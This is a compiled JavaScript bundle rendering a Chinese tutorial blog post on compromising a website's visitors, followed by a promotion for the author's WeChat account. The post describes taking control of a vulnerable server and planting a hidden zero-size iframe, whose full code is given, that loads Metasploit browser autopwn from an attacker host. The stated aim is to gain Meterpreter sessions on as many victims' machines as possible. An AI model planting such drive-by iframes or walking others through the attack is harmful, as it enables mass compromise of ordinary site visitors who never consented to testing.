(window.webpackJsonp=window.webpackJsonp||[]).push([[281],{577:function(s,a,t){"use strict";t.r(a);var r=t(7),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"对网站的客户进行渗透"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#对网站的客户进行渗透"}},[s._v("#")]),s._v(" 对网站的客户进行渗透")]),s._v(" "),a("p",[s._v("本次的渗透主要是找到有漏洞的网站，在有漏洞的网站中嵌入隐藏的iFrame，那么访问这个网站的所有系统都会遭受来自browser autopwn服务器的攻击。我们可以利用iFrame注入实现对网站用户的大规模入侵。")]),s._v(" "),a("p",[a("strong",[s._v("攻击网站的用户")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124193808368.png",loading:"lazy"}})]),s._v(" "),a("p",[a("strong",[s._v("具体实施")])]),s._v(" "),a("p",[a("strong",[s._v("首先，我们要获取一个存在漏洞的服务器的控制权限，这一点非常重要")])]),s._v(" "),a("p",[s._v("接着，我们在网站的某个页面中，嵌入类似如下的代码：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("iframe "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("src")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://192.168.175.128"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("width")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("height")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("style")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"hidden"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("frameborder")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("marginheight")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("marginwidth")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("scrolling")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("no"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("/iframe"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("每当有受害者访问网站时，上面的代码就会自动加载iFrame中的恶意browser autopwn。由于这段代码包含了一个iframe标签，它将会从攻击者系统中自动加载browser autopwn。我们需要保存这个文件，并允许用户对网站的访问。")]),s._v(" "),a("p",[s._v("受害者一旦访问了这个网页，browser autopwn将会自动在受害者的计算机上运行。我们必须确保browser autopwn模块正常运行")]),s._v(" "),a("p",[s._v("如果一切顺利，我们将会获得在目标系统中运行的Meterpreter。这种渗透思路是使用目标网站引诱最大数量的受害者，并进入到他们的系统中。")]),s._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),a("blockquote",[a("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);